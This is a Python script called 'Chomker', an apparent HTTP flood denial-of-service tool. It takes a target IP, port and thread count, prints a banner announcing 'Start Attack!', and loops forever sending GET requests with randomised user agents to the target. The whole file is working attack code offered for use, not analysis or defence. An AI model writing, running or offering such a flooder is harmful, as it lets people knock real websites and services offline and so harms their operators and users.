# Chomker
import time, sys, socket, urllib.request, random, os, optparse, threading
 
global headers, host, port

# Banner function
def banner():
    print("\t     /\            /\            /\            /\            /|            /\            /\    ")
    print("\t    /:/            \:\          /::\          |::\          |:|           /:/           /::\   ")
    print("\t   /:/              \:\        /:/\:\         |:|:\         |:|          /:/ /\        /:/\:\  ")
    print("\t  /:/               /::\      /:/  \:\      __|:|\:\        |:|         /:/ /:/       /:/ /:/  ")
    print("\t /:/     /\    /\  /:/\:\    /:/    \:\    /::::| \:\    /\_|:|____    /:/ /:/ /\    /:/ /:/___")
    print("\t \:\    /:/    \:\/:/  \/    \:\    /:/    \:\     \/    \:\/:::::/    \:\/:/ /:/    \:\/:::::/")
    print("\t  \:\  /:/      \::/          \:\  /:/      \:\           \::/~~~~      \::/ /:/      \::/~~~~ ")
    print("\t   \:\/:/        \:\           \:\/:/        \:\           \:\           \:\/:/        \:\     ")
    print("\t    \::/          \:\           \::/          \:\           \:\           \::/          \:\    ")
    print("\t     \/            \/            \/            \/            \/            \/            \/    \n")
    print("\t\t\t\t Coded By Chomikuj.pl\n")

def dos(host,port):
        try:
            sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error:
            print("Unknown socket rror")
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print("Could not resolve hostname.")
            os._exit(0)
        else:
            query = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(userAgents)+"\n"+headers).encode('utf-8')
            if sock.connect_ex((host,port))==0:
                if sock.sendall(query)==None:
                    sock.close()
                else:
                    print("#### Encountered an error while sending a packet to: "+str(host))
                    os._exit(0)


if __name__ == "__main__":
    # load agends from a text file
    userAgents = open("User_Agent.txt").read().split("\n")
    header = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language: en-us,en;q=0.5","Accept-Encoding: gzip,deflate","Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7","Keep-Alive: 115","Connection: keep-alive"]
    headers = ' \n'.join(header)

    target = input("input targetted IP: ")
    port = input("port (usually 80): ")
    threads = input("number of threads (reccommended 1): ")
    
    if target == None:
        banner()
        print("Is this even an IP?")
        sys.exit()
 
    host = target
    port = int(port)
    threads = int(threads)
 
    if target is not None:
        banner()
        print("=------ [+] Start Attack! =------")
        print("=------ [+] Site: "+host+" =------")
        print("=------ [+] Port: "+str(port)+" =------")
        print("=------ [+] Threads: "+str(threads)+" =------")
        print("\n")
        try:
            while True:
                for x in range(16):
                    th=threading.Thread(target=dos,args=(host,port),name="User-1")
                    th.Deamon=True
                    th.start()
                    th.join()
                print("\tSuccesfully sent 16 packets")
        except KeyboardInterrupt:
            print("\n\tYou've pressed Ctrl+C\n")
            os._exit(0)